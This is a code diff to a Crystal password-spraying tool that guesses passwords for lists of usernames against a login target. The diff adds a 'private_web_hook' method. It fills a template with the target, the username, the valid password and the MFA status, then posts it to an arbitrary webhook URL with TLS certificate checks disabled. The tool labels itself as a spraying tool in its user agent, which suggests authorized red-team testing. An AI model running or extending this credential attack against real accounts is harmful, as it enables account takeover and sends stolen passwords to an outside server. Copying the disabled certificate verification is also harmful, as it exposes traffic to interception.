@@ -31,7 +31,7 @@ end
 
 
 class Sprayer
-    property usernames : Array(String), passwords : Array(String), delay : Int32 , jitter : Int32  , target : String, uap : Bool, upf : Bool, webhook_url : String 
+    property usernames : Array(String), passwords : Array(String), delay : Int32 , jitter : Int32  , target : String, uap : Bool, upf : Bool, webhook_url : String , webhook_card : String 
     property valid : Array(String)
     property useragents : Array(String) = ["SprayCannon user agent. Password Spraying tool. Check your logs"]
     property targets : Array(String) = [""]
@@ -51,6 +51,7 @@ class Sprayer
         @upf = false
         @valid = [] of String
         @webhook_url = ""
+        @webhook_card = ""
         @targets_index = 0
         # @channel : Channel(Array(String|Bool|Nil) | Nil)
         # @rate = 1 
@@ -68,6 +69,7 @@ class Sprayer
         @upf = false
         @valid = [] of String
         @webhook_url = ""
+        @webhook_card = ""
         @targets_index = 0
     end
 
@@ -83,6 +85,7 @@ class Sprayer
         @uap = false
         @upf = false
         @webhook_url = ""
+        @webhook_card = ""
         @targets_index = 0
     end
 
@@ -98,6 +101,7 @@ class Sprayer
         @uap = false
         @upf = false
         @webhook_url = ""
+        @webhook_card = ""
         @targets_index = 0
     end
 
@@ -231,7 +235,7 @@ class Sprayer
                         if db
                             insert_db_sprayed(db, uname, pass) unless res.as(SprayStatus).lockedout # add to sprayed unless it was locked
                             insert_db_valid(db, uname, pass) if res.as(SprayStatus).valid_credentials  # add to valid db if valid
-                            puts "Inserting into invalid_usernames" if res.as(SprayStatus).invalid_username
+                            puts "Inserting #{uname} into invalid_usernames" if res.as(SprayStatus).invalid_username
                             insert_db_invalid(db, uname) if res.as(SprayStatus).invalid_username
                         end
 
@@ -923,6 +927,7 @@ class Sprayer
             googlechat_web_hook(username, password , mfa )
         end
     end
+
     protected def web_hook( st : SprayStatus )
         STDERR.puts "Sending webhook"
 
@@ -934,6 +939,8 @@ class Sprayer
             slack_web_hook(st)
         elsif @webhook_url.includes? "chat.googleapis.com"
             googlechat_web_hook(st)
+        else 
+            private_web_hook(st)
         end
     end
 
@@ -1309,6 +1316,28 @@ class Sprayer
                 ]
             }
         )
+
+        # added this so if going through burp you will be fine 
+        context = OpenSSL::SSL::Context::Client.new
+        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
+        begin 
+            answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card, tls: context )
+            if answer.status_code != 200
+                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
+            end
+        rescue 
+            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
+        end
+    end
+
+    protected def private_web_hook(st : SprayStatus )
+        card = @webhook_card
+        mfa_str = "No"
+        mfa_str = "Yes" if st.mfa
+        card = card.gsub("-%- TARGET -%-", @target )
+        card = card.gsub("-%- USERNAME -%-", st.username )
+        card = card.gsub("-%- PASSWORD -%-", st.password )
+        card = card.gsub("-%- MFA -%-", mfa_str )
 
         # added this so if going through burp you will be fine 
         context = OpenSSL::SSL::Context::Client.new
